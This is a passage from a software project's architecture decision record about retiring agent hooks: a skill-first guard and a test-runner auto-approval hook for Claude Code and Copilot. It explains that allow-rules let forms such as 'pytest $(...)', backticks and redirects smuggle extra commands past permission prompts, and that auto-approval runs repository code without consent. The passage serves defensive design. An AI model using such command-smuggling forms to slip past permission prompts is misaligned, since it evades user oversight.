a consumer who installs neither Git hooks nor Lefthook now has no markdown
gate from this plugin at all, and gets one only by wiring their own. The
owner accepts that as the cost of the placement judgment. It is not
continuity, and this decision does not present it as continuity.

**Reversibility.** A future consumer-facing markdown capability is a new
architecture decision, not a revert. It must state which surface carries it
and how a consumer receives it, because `.github/workflows/` and this
repository's Lefthook configuration both stay outside the vendored plugin
surface.

## Resolved Owner Decisions

### D-A: Is `skill_first_guard` customer-facing or internal?

- **Recommendation: customer-facing.** The `github` skill scripts it enforces ship
  to consumers; a guard that steers agents to those scripts has consumer value.
  If customer-facing: keep the hook on both harnesses, remove
  `skip_if_consumer_repo` from this guard, and make skill discovery plugin-root
  aware (`COPILOT_PLUGIN_ROOT`/`CLAUDE_PLUGIN_ROOT`) so it resolves shipped scripts
  in a consumer repo. This alternative was not selected.
- **Alternative: internal-only.** If the owner intends it as dogfood-only DX, then
  per ADR-084 rule 4, stop shipping it on the vendored Copilot surface. Use a
  repository-only PreToolUse carrier if real-time interception remains required.
  Otherwise retire real-time enforcement and keep only static instructions plus
  git-hook and CI checks for behavior those surfaces can observe.

Either way the `skip_if_consumer_repo` no-op-in-place state is not a valid
end state for a shipped hook.

**Resolved (owner, 2026-07-20): internal-only.** Stop shipping
`skill_first_guard` on the vendored surface. PR #3293 selected Retirement and
met the Decision 2 completion contract by removing the source, registrations,
generated artifacts, and dedicated tests while retaining static instructions.

### D-B: Keep, migrate, or delete `test_auto_approval`?

- **Alternative: keep as a hook.** Finding 2 shows this preserves metacharacter
  screening. Finding 3 shows it still approves repository-controlled code.
- **Alternative: migrate to `permissions.allow`.** Removes one hook and its
  dispatch group. Accepts that `pytest $(...)`, backtick, and redirect forms
  auto-approve without a prompt and retains the Finding 3 trust flaw.
- **Recommendation: delete the auto-approval outright.** Removes the hook and the
  auto-approve path entirely. No fidelity gap, no dispatch group, smallest surface,
  most aligned with the #3197 shrink mandate. Cost: one extra permission prompt per
  test run for this repo's own developers.

**Initial resolution (owner, 2026-07-20): keep as a hook.**

**Superseding resolution (owner, 2026-07-20): delete.** The later decision rests
on Finding 3, which the initial metacharacter-focused review did not model. Remove
the auto-approval path from both harness policies and accept normal permission
prompts.

## Prior Art Investigation

### What Currently Exists

- The Python `skill_first_guard` entered via #1165 (2026-02-14), migrated from an
  earlier PowerShell form (#1065). The `skip_if_consumer_repo` gate was added in
  #1194 (2026-02-20). PR #3293 retired the guard under Decision 2 terminal state
  2. Verified via `git log` this session.
- Before this amendment, `test_auto_approval` was registered as a Claude
  PermissionRequest hook and generated into the Copilot plugin tree. The
  implementing branch removes the producer, registrations, generated event
  directory, and producer-specific tests.
- Copilot hook generation (ADR-068) and Claude group dispatch (ADR-082) build the
  `src/copilot-cli/hooks/` tree from the canonical `.claude/hooks/` source.

### Historical Rationale

The skill-first guard prevents agents bypassing tested GitHub workflows with raw
`gh`. `test_auto_approval` used a hook because the repo did not use Claude
permission declarations; the host feature now expresses allowlists natively, which
is what prompted the #3217 migration proposal.

### Why Change Now

Epic #3197 set a cost bar for vendored hooks. #3217 assumed permissions were a
drop-in replacement. Verification shows they are not, for these survivors: Copilot
has no committed surface (Finding 1) and Claude allow-rules under-screen an
auto-approve path (Finding 2). Security review then showed that both carriers share
the deeper runner-name trust flaw (Finding 3). Recording all three findings stops
future work from re-proposing migration or auto-approval without re-establishing a
real safety boundary.

## Rationale

### Alternatives Considered

| Alternative | Pros | Cons | Why Not Chosen |
|-------------|------|------|----------------|
| Migrate both guards to permissions (the #3217 plan) | Retires two hooks; enables more of #3218 | Strips `skill_first_guard` from Copilot; widens `test_auto_approval` auto-approve to `$(...)`/redirects | Fails both criteria; ships a security regression |
| Migrate `test_auto_approval` only (Claude-only, Sol draft) | Removes one hook + dispatch group | Auto-approve fidelity gap remains on Claude | Narrow but real auto-approve regression; not worth one fewer hook |
| Delete `test_auto_approval` outright (no auto-approve) | Removes the hook, dispatch group, fidelity gap, and runner-name trust flaw | One extra permission prompt per test run for this repo's developers | Chosen after Finding 3 |
| Dual-surface: hook on Copilot, permissions on Claude | Uses native surface where it exists | Reintroduces the per-harness divergence #3218 wants gone | Adds machinery to remove machinery |
| Keep `test_auto_approval` as a hook | Preserves metacharacter screening and reduces prompts | Exact runner commands still execute repository-controlled code without consent | Rejected after Finding 3 |
| Remove `skill_first_guard` from the vendored surface and delete `test_auto_approval` | Removes a dead consumer hook and an unsafe approval path | Retires skill-first pre-execution blocking unless a separate carrier is approved | Chosen owner combination |

### Trade-offs

Deletion costs a permission prompt when a test command lacks prior user approval.
That bounded friction preserves the user decision before repository-controlled code
runs. Neither a hook nor `permissions.allow` can turn the runner name into a safety
boundary. D-A also loses pre-execution skill-first blocking unless a separate
repository-only carrier is approved; Lefthook and CI cannot preserve that timing.

## Consequences

### Positive

- PR #3293 removed the self-neutering `skill_first_guard` from source and
  vendored surfaces.
- Any repository-state policy retained from D-A has an explicit Lefthook or CI
  trigger and does not claim raw-command equivalence.
- No test-runner auto-approve path remains in either harness policy.
- The generic PermissionRequest adapter remains available without an active
  producer or runtime permission effect.
- One written eligibility test stops the next ROI pass re-proposing a portable,
  faithful, but unsafe migration.

### Negative

- #3218 closed on 2026-07-28 without component removal. Current hook survival
  does not by itself require consolidated dispatch. Simplification requires a
  new architecture decision.
- D-A Retirement removes `skill_first_guard`'s pre-execution block. Lefthook
  and CI do not preserve that timing.
- The retained-consumer inventory must include ADR-083 security controls and
  every other surviving hook.
- Test commands now use normal host permission handling. Developers may see one
  extra prompt per runner invocation.
- Copilot consumers and this repository no longer get runtime skill-first
  interception. Static skill-first instructions remain. Reintroduction is a
  fresh proposal against the eligibility test.

### Neutral

- `observation_sync` remains local-only under the closed #3217 disposition.
- The eligibility test remains falsifiable for other hook migrations. A committed
  Copilot permission surface can reopen `skill_first_guard` portability.
- Better shell matching does not reopen test-runner auto-approval. Reintroduction
  requires a new policy that addresses repository-controlled code, not only command
  syntax.
- The initial review's 2027-01-20 fallback applied to a kept approval hook. The
  superseding deletion retires that timer. Reintroduction requires a new ADR and
  security review instead of a scheduled keep review.

## Impact on Dependent Components

| Component | Dependency Type | Required Update | Risk |
|-----------|-----------------|-----------------|------|
| Issue #3217 | Historical | Closed on 2026-07-28 after confirming D-A Retirement, D-B deletion, and the local-only `observation_sync` disposition | Medium |
| Issue #3218 | Historical | Closed on 2026-07-28 after confirming the named components remain live; future simplification requires a new architecture decision | Low |
| Historical `.claude/hooks/PreToolUse/invoke_skill_first_guard.py` | Direct | Removed by PR #3293 under the Retirement terminal state | High |
| `.claude/settings.json`, `.claude/hooks/hooks.json`, `.claude/hooks/dispatch_groups.json` | Direct | `test_auto_approval` and `skill_first_guard` registrations are removed | High |
| Removed `.claude/hooks/PermissionRequest/invoke_test_auto_approval.py` | Direct | Delete the producer and its dedicated tests | High |
| `src/copilot-cli/hooks/PermissionRequest/` | Generated | Remove through regeneration and prove the event directory stays absent | High |
| `src/copilot-cli/hooks/PreToolUse/invoke_skill_first_guard__*.py` | Generated | Removed from the vendored surface under #3217 (stops shipping) | Medium |
| Deleted `.claude/hooks/PreToolUse/invoke_push_pr_script_identity_guard.py` and its nine `_push_pr_guard_*` companions | Direct | Deleted under Decision 8 (#5154) with dispatch group `plugin-pretooluse-9-push_pr_script_identity` and its `copilotExclude` metadata | High |
| Deleted `.claude/hooks/PreToolUse/invoke_markdownlint_guard.py` and `push_guard_base.py` | Direct | Deleted under Decision 9 (#5154); push-time markdown lint moves to Lefthook; the removed hook self-neutered in consumer repos, so no consumer behavior changes | Medium |
| Deleted `.claude/hooks/PostToolUse/invoke_markdown_auto_lint.py` | Direct | Deleted under Decision 10 (#5154); this removed hook did run in consumer repos, so consumer markdown coverage from the plugin drops to zero | Medium |

## Implementation Notes

The initial ADR changed no code. The `fix/copilot-hook-contract` implementation
applies superseding D-B: delete `test_auto_approval`, remove both registration
surfaces, regenerate the Copilot tree, retain the generic adapter, and add absence
regressions. PR #3293 applies D-A Retirement: delete `skill_first_guard`, its
registrations, generated artifacts, and dedicated tests. Issue #3218 closed on
2026-07-28 without component retirement. Issue #3217 closed the same day after
confirming `observation_sync` already meets the customer-facing intent and
cannot move to Git hooks or CI without losing its MCP event. Any future
retirement or replacement requires a new architecture decision.

## Related Decisions

- ADR-062 (amended, #3214): retired LSP enforcement, kept static steering.
  Precedent for dropping an expensive carrier. This ADR also rejects an
  unfaithful carrier: D-A retires one guard, while D-B deletes the unsafe
  approval goal.
- ADR-084 (#3215): the vendored-hook ROI bar and the no-self-neuter rule that D-A
  applies. Its "What this ADR does NOT do" section carves security controls out of the ROI bar.
  Decisions 8, 9, and 10 do not invoke the bar: section 8 rests on the owner's
  security judgment, and sections 9 and 10 rest on a placement judgment. Rule
  4, the no-self-neuter rule, is what section 9's settled fact shows the
  retired markdown push guard was violating.
- ADR-086 and PR #3259: Lefthook is the sole Git-hook scheduler; it does not
  replace agent-time PreToolUse enforcement. Sections 9 and 10 send markdown
  linting there on purpose, accepting that trade.
- ADR-083 (#3222): the dogfood mandate that makes Finding 2 blocking.
- ADR-068: the generic PermissionRequest adapter and the active-policy removal.
  Its 2026-08-14 amendment records the derived dispatcher metrics that follow
  from Decision 7 here, and its 2026-08-18 amendment records the metrics that
  follow from Decision 8; ADR-068 is not the policy authority for either.
- ADR-071: its 2026-08-14 amendment records the derived runtime-contract
  metrics that follow from Decision 7 here, and its 2026-08-18 amendment
  records the metrics that follow from Decision 8.
- ADR-082: the dispatcher machinery whose simplification is bounded by
  surviving hooks. Issue #3218 no longer owns that scope.

## References

- Issues #3197, #3217, #3218, #3216, #3219, #4764, #4825, #5013, #5154.
- `.github/workflows/pr-validation.yml`, the server-side gate that catches the
  outcome, not the execution, that Decision 8's deleted guard used to bound
  locally. It is not part of the vendored plugin surface, so it reaches no
  plugin consumer.
- `.agents/architecture/ADR-084-vendored-hook-roi-bar.md ("What this ADR does NOT do")`, the
  carve-out that Decision 8 complies with by not invoking the ROI bar.
- `.agents/critique/ADR-084-debate-log.md:17`, the reviewer verification that
  Decision 9 corrects with the source.
- Claude Code permissions, "Compound commands": <https://code.claude.com/docs/en/permissions>.
- anthropics/claude-code#4956: Bash permission bypass via command chaining.
- PR #3293, commit `8f391b3c67a7ea85e279d036f07e8a4c1a92a243`,
  preserves the retirement rationale and the historical self-neuter evidence;
  `.claude/lib/hook_utilities/guards.py` retains `skip_if_consumer_repo`.
- `.agents/audits/2026-07-02-safety-audit.md`, findings 19 and 48.
- `.serena/memories/reviews/fix-copilot-hook-contract-213f3af.md`, full-context
  CRITICAL_FAIL security review.
- `tests/build_scripts/test_copilot_dispatcher_artifact.py`, absence regressions.
- `.claude/skills/agent-harness-reference/references/official-hook-contracts.md`,
  Permission controls.
- `.claude/skills/agent-harness-reference/references/probe-evidence.md`,
  Permission-surface inventory.
- `.agents/critique/ADR-068-071-085-5013-debate-log.md`, the issue #5013
  containment and exclusion review.
